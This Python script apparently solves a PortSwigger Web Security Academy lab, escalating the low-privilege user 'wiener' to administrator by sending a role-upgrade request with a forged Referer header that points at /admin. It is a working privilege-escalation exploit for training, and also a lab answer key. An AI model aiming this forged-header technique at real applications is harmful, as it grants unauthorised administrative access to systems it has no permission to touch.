#!/usr/bin/env python3
"""
Referer-based access control
PortSwigger Web Security Academy -- Access Control

Companion script for the writeup: 13-referer-based-access-control.md

What this does:
    Logs in as administrator first to confirm the promotion endpoint and
    parameter shape. Then logs in as wiener and sends the same promotion
    request with a hand-set Referer header pointing at /admin -- the server
    checks for that header value instead of the session's actual role, and
    the client fully controls what Referer says.

Usage:
    python 13-referer-based-access-control.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def get_csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def login(client: httpx.Client, base: str, username: str, password: str) -> httpx.Response:
    login_page = client.get(f"{base}/login")
    csrf = get_csrf(login_page.text)
    return client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    # Log in as administrator first to confirm the endpoint and parameters.
    admin_client = httpx.Client(follow_redirects=True, timeout=15)
    login(admin_client, lab_url, "administrator", "admin")
    resp = admin_client.get(f"{lab_url}/admin")
    print(f"[*] Admin panel: {resp.status_code}")

    # Log in as wiener and forge the Referer header.
    client = httpx.Client(follow_redirects=True, timeout=15)
    login(client, lab_url, "wiener", "peter")

    resp = client.get(
        f"{lab_url}/admin-roles",
        params={"username": "wiener", "action": "upgrade"},
        headers={"Referer": f"{lab_url}/admin"},
    )
    print(f"[*] GET /admin-roles with Referer={lab_url}/admin: {resp.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- wiener promoted via forged Referer header.")
    else:
        print("[-] Not solved yet -- confirm the Referer value matches what the check expects.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
